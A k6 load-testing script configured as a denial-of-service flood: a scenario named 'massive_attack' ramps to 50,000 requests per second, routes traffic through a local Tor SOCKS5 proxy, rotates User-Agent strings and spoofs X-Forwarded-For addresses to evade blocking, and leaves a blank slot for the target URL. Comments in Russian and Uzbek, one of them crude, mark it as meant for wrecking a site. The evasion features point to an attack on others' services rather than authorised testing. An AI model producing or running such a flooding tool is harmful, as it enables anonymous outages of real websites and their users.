import http from 'k6/http';
import { sleep, check } from 'k6';
import { randomIntBetween } from 'https://jslib.k6.io/k6-utils/1.2.0/index.js';

export const options = {
  scenarios: {
    massive_attack: {
      executor: 'ramping-arrival-rate',
      startRate: 1000,
      timeUnit: '1s',
      preAllocatedVUs: 2000,
      maxVUs: 10000,
      stages: [
        { duration: '30s', target: 5000 },   // 5k rps
        { duration: '1m', target: 20000 },   // 20k rps
        { duration: '2m', target: 50000 },   // 50k rps
        { duration: '30s', target: 0 },
      ],
    },
  },
  thresholds: {
    http_req_failed: ['rate<0.5'],
  },
};

// Подключаем Tor как SOCKS5 прокси
const torProxy = 'socks5://127.0.0.1:9050';
const httpParams = {
  proxy: torProxy,
  headers: {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
  },
};

function randomUA() {
  const uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
  ];
  return uas[Math.floor(Math.random() * uas.length)];
}

export default function () {
  // Меняем User-Agent для каждого запроса
  const params = JSON.parse(JSON.stringify(httpParams));
  params.headers['User-Agent'] = randomUA();
  params.headers['X-Forwarded-For'] = `10.${randomIntBetween(0,255)}.${randomIntBetween(0,255)}.${randomIntBetween(0,255)}`;

  const url = ''; // bu yerga target url

  // Разные методы для пиздеца
  const methods = ['GET', 'POST', 'PUT', 'DELETE'];
  const method = methods[Math.floor(Math.random() * methods.length)];

  let res;
  if (method === 'GET') {
    res = http.get(url, params);
  } else if (method === 'POST') {
    const payload = JSON.stringify({ fake: 'data', rand: randomIntBetween(1, 999999) });
    res = http.post(url, payload, params);
  } else {
    res = http.del(url, params);
  }

  check(res, {
    'status is not 500': (r) => r.status !== 500,
  });

  sleep(Math.random() * 0.1);
}
